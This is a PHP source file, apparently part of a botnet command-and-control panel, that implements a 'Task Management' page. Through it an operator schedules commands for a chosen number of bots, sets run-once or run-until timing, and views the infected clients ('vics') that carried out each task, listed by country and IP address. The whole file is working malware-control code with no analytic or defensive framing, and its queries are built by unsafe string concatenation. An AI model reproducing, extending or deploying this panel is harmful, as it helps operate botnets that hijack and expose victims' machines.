<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	class Template_Management
	{
		private $Content = NULL;
		private $Title = 'Task Management';
		
		public function __construct()
		{
			global $Commands;
			
			if(isset($_GET['new'])) { $this->NewTask(); }
				elseif(isset($_GET['delete'])) { $this->DeleteTask(intval($_GET['id'])) . $this->ShowEntrys(); }
					elseif(intval($_GET['id'])) { $this->ShowID(intval($_GET['id'])); }
						else { $this->ShowEntrys(); }
			
			$this->Content .= ('<br /><div class="title">Commands</div>');
			foreach($Commands as $Command => $Description) { $this->Content .= ('<blockquote><b>' . $Command . '</b> - ' . $Description . '</blockquote>'); }
		}

		private function ShowEntrys() 
		{
			global $CTypeList;
			global $DB;
			
			$Query = $DB->Query("SELECT t.*, (SELECT COUNT(*) FROM clients WHERE TID = t.TID) AS vics, 
				(SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) AS done FROM tasks AS t WHERE t.time <= '" . time() . 
					"' AND (t.elapsed > '" . time() . "' OR (t.elapsed = '0' AND (SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) < t.clients))");
			
			$this->Content .= ('<div class="title">Current Tasks (' . $DB->NumRows($Query) . ')</div>');

			$this->Content .= ('
				<table>
					<tr>
						<td width="7%"><b>ID</b></td>
						<td width="45%"><b>Command</b></td>
						<td width="18%"><b>Start Time</b></td>
						<td width="16%"><b>Run Until</b></td>
						<td width="14%"><b>Bots</b></td>
					</tr>');
			
			while($Data = $DB->GetRowArray($Query))
				$this->Content .= ('<tr><td>#' . $Data['TID'] . '</td><td><a href="?q=management&id=' . $Data['TID'] . '">' . array_search($Data['type'], $CTypeList) . ' (' . $Data['options'] . ')' . '</a></td><td>' . date("d.m.Y H:i", $Data['time']) . '</td><td>' . ($Data['elapsed'] > 0 ? date("d.m.Y H:i", $Data['elapsed']) : 'Finishing') . '</td>'. ($Data['done'] >= ($Data['clients'] / 2) ? '<td style="background-color: #F5B57D; text-align: center;">' : '<td style="background-color: #F39595; text-align: center;">'). ($Data['elapsed'] == 0 ? $Data['done'] . '/' : '') . $Data['clients'] . '</td></tr>');
			
			$this->Content .= '</table><div style="text-align:right;padding:10px"><a href="?q=management&new" class="button"><span>New Task</span></a></div>';
			
			$Query = $DB->Query("SELECT t.*, (SELECT COUNT(*) FROM clients WHERE TID = t.TID) AS vics, 
				(SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) AS done FROM tasks AS t WHERE t.time > '" . time() . 
					"' OR (t.elapsed < '" . time() . "' AND t.elapsed != '0') OR (t.elapsed = '0' AND (SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) >= t.clients)");
			
			if(!$DB->NumRows($Query)) { return; }
			$this->Content .= ('<div class="title">Future / Done Tasks (' . $DB->NumRows($Query) . ')</div>');

			$this->Content .= ('
				<table>
					<tr>
						<td width="7%"><b>ID</b></td>
						<td width="45%"><b>Command</b></td>
						<td width="18%"><b>Start Time</b></td>
						<td width="16%"><b>Run Until</b></td>
						<td width="14%"><b>Bots</b></td>
					</tr>');
			
			while($Data = $DB->GetRowArray($Query)) 
				$this->Content .= ('<tr><td>#' . $Data['TID'] . '</td><td><a href="?q=management&id=' . $Data['TID'] . '"><b>' . array_search($Data['type'], $CTypeList) . ' (' . $Data['options'] . ')' . '</b></a></td><td>' . date("d.m.Y H:i", $Data['time']) . '</td><td>' . ($Data['elapsed'] > 0 ? date("d.m.Y H:i", $Data['elapsed']) : (($Data['time'] > time()) ? 'Waiting' : 'Finished')) . '</td>' . ($Data['time'] > time() ? '<td style="background-color: #EBEA9B; text-align: center;">' : '<td style="background-color: #AED0A3; text-align: center;">') . ($Data['elapsed'] == 0 ? $Data['done'] . '/' : '') . $Data['clients'] . '</td></tr>');
			
			$this->Content .= ('</table>');
		}
		
		private function NewTask()
		{
			global $CTypeList;
			global $DB;
			
			$this->Content .= ('<div class="title">New Task</div>');
			
			$CType = htmlentities($_POST['CType'], ENT_QUOTES);
			$Options = htmlentities($_POST['options'], ENT_QUOTES);
			$Start = htmlentities($_POST['start'], ENT_QUOTES);
			$Bots = htmlentities($_POST['clients'], ENT_QUOTES);
			$Type = htmlentities($_POST['type'], ENT_QUOTES);
			$End = htmlentities($_POST['end'], ENT_QUOTES);
			
			if($_POST['submit'])
			{
				if($Start)
				{
					list($Date, $Time) = explode(' ', trim($Start));
					$Date = explode('.', $Date);
					$Time = explode(':', $Time);
					$StartTime = @mktime($Time[0], $Time[1], 0, $Date[1], $Date[0], $Date[2]);
				} else { $StartTime = NULL; }
				
				if($End)
				{
					list($Date, $Time) = explode(' ', trim($End));
					$Date = explode('.', $Date);
					$Time = explode(':', $Time);
					$EndTime = @mktime($Time[0], $Time[1], 0, $Date[1], $Date[0], $Date[2]);
				} else { $EndTime = NULL; }
				
				if(!trim($Options)) { $this->Content .= ('<div class="notification error">Command is not specified !</div>'); }
				elseif(trim($Start) != date("d.m.Y H:i", $StartTime)) { $this->Content .= ('<div class="notification error">Invalid Start Time !</div>'); }
				elseif(intval($Bots) <= 0) { $this->Content .= ('<div class="notification error">Invalid number of Bots or not specified !</div>'); }
				elseif($Type != "once" && $Type != "until") { $this->Content .= ('<div class="notification error">Type of Task is not specified !</div>'); }
				elseif($Type == "until" && trim($End) != date("d.m.Y H:i", $EndTime)) { $this->Content .= ('<div class="notification error">Invalid End Time !</div>'); }
				else
				{
					$DB->Query("INSERT INTO tasks (time, elapsed, type, options, clients) VALUES ('{$StartTime}', '" . ($Type == "until" ? $EndTime : 0) . "', '" . $DB->SaveRead($CType) . "', '" . $DB->SaveRead($Options) . "', '" . intval($Bots) . "')");
					$this->Content .= ('<div class="notification success">Task successfully created!</div>');
					$this->Content .= $this->ShowID($DB->GetIID());
					return true;
				}
			}
			
			$this->Content .= '<form method="post" action="?q=management&new"><table style="padding-left: 80px;">';
			$this->Content .= '<tr><td style="text-align:right">Command:</td>
			
			<td><select name="CType" style="width: 115px; height: 32px;">';
			
			arsort($CTypeList);
			if (empty($CType)) { $CType = (count($CTypeList) + 1); }

			foreach ($CTypeList as $_K => $_C)
				$this->Content .= "<option value='{$_C}'" . (($CType == $_C) ? ' selected' : '') . ">{$_K}</option>";	
			
			$this->Content .= '</select>&nbsp;<input type="text" style="height: 15px; padding-top: 8px;" name="options" value="' . $Options . '" /></td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">Start Time:</td><td><input type="text" name="start" value="' . ($Start ? $Start : date("d.m.Y H:i")) . '"></td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">Number of Bots:</td><td><input type="text" name="clients" value="' . $Bots . '"/></td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">Task Type:</td><td><input type="radio" style="width:0px" value="once" name="type"' . ($Type == "once" ? ' checked="checked"' : '') .
				'/> Run Once <input type="radio" style="width:0px" value="until" name="type"' . ($Type == "until" ? ' checked = "checked"' : '') . '/> Run Until</td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">End Time:</td><td><input type="text" name="end" value="' . ($End ? $End : date("d.m.Y H:i")) . '"></td></tr>';
			$this->Content .= '<tr><td>&nbsp;</td><td style="text-align:right;padding-right:20px;"><input type="submit" class="button" value="Create Task" name="submit" /></td></tr>';		
			$this->Content .= '</table></form>';
		}
		
		private function ShowID($qID)
		{
			global $CTypeList;
			global $Base;
			global $DB;
			
			$Query = $DB->Query("SELECT t.*, (SELECT COUNT(*) FROM clients WHERE TID = t.TID) AS vics, 
				(SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) AS done FROM tasks AS t WHERE t.TID = '" . $qID . "'");
			
			$Data = $DB->GetRowArray($Query);
			$this->Content .= ('<div class="title">Details</div>');
			
			$this->Content .= '<table>';
			$this->Content .= '<tr><td style="text-align:right;width:40%">Task ID:</td><td><b>' . $Data['TID'] . '</b></td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">Command:</td><td><b>' . array_search($Data['type'], $CTypeList) . ' (' . $Data['options'] . ')' . '</b></td></tr>';
			$this->Content .= '<tr><td style="text-align:right;">Start Time:</td><td>' . date("d.m.Y H:i", $Data['time']) . '</td></tr>';
			if($Data['elapsed']) { $this->Content .= '<tr><td style="text-align:right;">End Time:</td><td>' . date("d.m.Y H:i", $Data['elapsed']) . '</td></tr>'; }
			$this->Content .= '<tr><td style="text-align:right;">Number of Bots:</td><td>' . $Data['clients'] . ' Bots</td></tr>';
			if(!$Data['elapsed']) { $this->Content .= '<tr><td style="text-align:right;">Done by:</td><td>' . $Data['done'] . ' Bots</td></tr>';}
			$this->Content .= '</table><div style="text-align:right;padding:10px"><a href="?q=management&delete&id=' . $Data['TID'] . '" onclick="return confirm(\'Do you really want to delete this Task ?\')" class="button"><span>Delete Task</span></a></div>';
			
			if($Data['elapsed'])
			{
				$Query = $DB->Query("SELECT * FROM clients WHERE TID = '" . $qID . "' AND Request > '" . (time() - ST_BOT_TIME_ON) . "'");
				if(!$DB->NumRows($Query)) { return false; }
				$this->Content .= ('<div class="title">Current Bots (' . $DB->NumRows($Query) . ')</div>');
			}
			else
			{
				$Query = $DB->Query("SELECT v.* FROM tasks_done AS d LEFT JOIN clients AS v ON (v.UID = d.UID) WHERE d.TID = '" . $qID . "'");
				if(!$DB->NumRows($Query)) { return false; }
				$this->Content .= ('<div class="title">Done by the following Bots (' . $DB->NumRows($Query) . ')</div>');
			}
			
			$this->Content .= ('<br />
				<table>
					<tr>
						<td width="75%"><b>Country</b></td>
						<td><b>IP</b></td>
					</tr>');
			
			while($Data = $DB->GetRowArray($Query))
				$this->Content .= ('<tr><td><img src="resources/flags/' . strtolower(($Data['Country'] ? $Data['Country'] : '00')) . '.gif">&nbsp;' . ($Base->GetCountryName($Data['Country']) . ' (' . ($Data['Country'] ? $Data['Country'] : '??') . ')') . '</td><td>' . $Data['IP'] . '</td></tr>');
			
			$this->Content .= '</table>';
		}
		
		private function DeleteTask($qID) 
		{
			global $DB;
			
			$DB->Query("DELETE FROM tasks WHERE TID = '" . $qID . "'");
			$DB->Query("DELETE FROM tasks_done WHERE TID = '" . $qID . "'");
			$DB->Query("UPDATE clients SET TID = '0' WHERE TID = '" . $qID . "'");
			$this->Content .= ('<div class="notification success">Task successfully deleted!</div>');
		}
		
		public function GetContent()
		{
			return $this->Content;
		}
		
		public function GetTitle()
		{
			return $this->Title;
		}
	}
?>